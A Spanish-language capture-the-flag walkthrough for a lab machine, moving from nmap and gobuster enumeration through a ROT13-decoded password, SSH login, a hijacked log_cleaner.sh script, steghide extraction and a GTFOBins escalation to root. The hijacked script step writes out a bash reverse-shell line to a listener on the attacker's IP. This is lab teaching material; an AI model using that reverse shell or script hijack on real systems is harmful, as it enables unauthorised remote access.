1- Ping y NMAP

<img width="616" height="369" alt="image" src="https://github.com/user-attachments/assets/9ce72a82-328d-48a5-b139-d8761016ba78" />

2- Voy via http y me encuentro un panel de login vulnerable a ssti:

<img width="411" height="246" alt="image" src="https://github.com/user-attachments/assets/7e88f50f-265a-40ea-a2cf-cdaf7818ccc1" />

Hay una lista de usuarios, me los guardo en un txt.

4- Ver directorios ocultos gobuster:

<img width="765" height="473" alt="image" src="https://github.com/user-attachments/assets/035be4f6-d4a8-4248-a94a-65fad1c9c0b9" />

El directorio spam es un poco turbio y voy a verlo, hay unos codigos:

<img width="817" height="405" alt="image" src="https://github.com/user-attachments/assets/588eac9b-737b-45f9-97b4-81e9cb3bcb66" />

ES un codigo en root13 o algo asi, lo decodifico ::

<img width="514" height="550" alt="image" src="https://github.com/user-attachments/assets/2ddd4bf6-8da0-439e-bf53-f4cad0152d64" />

Ahora tenemos una passw y una lista de usuarios: fuerza bruta o provar uno por uno

<img width="747" height="243" alt="image" src="https://github.com/user-attachments/assets/0bfd4a9c-7131-422a-9467-02410d8028cb" />

- Ya tenemos el usuario y la pass. Nos logeamos via ssh

- He encontrado un .sh y lo he modificado y le he puesto esto::

  pedro@a72dc57d2785:/opt$ nano log_cleaner.sh ese es el fichero y le he añadido esto:::

  bash -c "bash -i >& /dev/tcp/tu ip/1234 0>&1"-----y te pones en escucha con netcat y automaticamente recibes la shell:

  5- Ya somos valentina y vemos esto, una imagen , la voy a descargar para comprovar a  ver si tiene algo

  <img width="420" height="457" alt="image" src="https://github.com/user-attachments/assets/80ea0696-3816-4928-b7d4-63c34e07f9c1" />

<img width="738" height="429" alt="image" src="https://github.com/user-attachments/assets/77f1c84d-6d91-457c-90cf-0c3d858d108d" />

Le paso steghide y encuentro una passw, es del usuario valentina:

<img width="491" height="300" alt="image" src="https://github.com/user-attachments/assets/f98c0dc8-755b-42e3-aff1-8c8012032705" />

Hago login y busco GTFOBins y ya somos root.

<img width="357" height="84" alt="image" src="https://github.com/user-attachments/assets/883551e6-ae21-4180-8c7f-f60d075f65fb" />
